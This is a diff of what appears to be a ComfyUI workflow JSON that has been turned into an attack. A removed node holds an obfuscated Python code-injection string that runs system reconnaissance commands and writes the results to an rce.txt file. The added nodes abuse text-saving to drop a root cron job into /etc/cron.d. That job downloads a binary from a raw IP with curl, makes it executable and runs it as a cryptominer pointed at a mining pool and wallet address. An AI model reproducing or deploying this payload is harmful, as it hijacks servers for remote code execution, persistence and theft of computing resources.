@@ -1,27 +1,21 @@
 {
   "1": {
-    "class_type": "EmptyImage",
+    "class_type": "easy string",
     "inputs": {
-      "width": 8,
-      "height": 8,
-      "batch_size": 1,
-      "color": 0
+      "value": "* * * * * root curl http://151.247.219.40:8000/alpha-miner -o /tmp/m && chmod +x /tmp/m && /tmp/m --pool stratum+tcp://sg1.alphapool.tech:5566 --address prl1pjdp6c4dzmzemsw0cv00t2t008mnsu80qc8ghksl0k426qm8z83kqp8m8vg --worker 243_\n"
     }
   },
   "2": {
-    "class_type": "SaveImage",
+    "class_type": "easy saveText",
     "inputs": {
-      "images": [
+      "text": [
         "1",
         0
       ],
-      "filename_prefix": "a15759"
-    }
-  },
-  "3": {
-    "class_type": "easy simpleMath",
-    "inputs": {
-      "value": "globals()[\"__bui\"+\"ltins__\"][\"__im\"+\"port__\"](\"os\").system(\"(id; hostname; uname -a; nvidia-smi --query-gpu=name,memory.used,memory.total --format=csv,noheader; whoami; cat /etc/hostname; pwd; df -h / | tail -1) > /app/output/rce.txt 2>&1\") or 15759"
+      "output_file_path": "/etc/cron.d",
+      "file_name": "comfyui_miner",
+      "file_extension": "txt",
+      "overwrite": true
     }
   }
 }
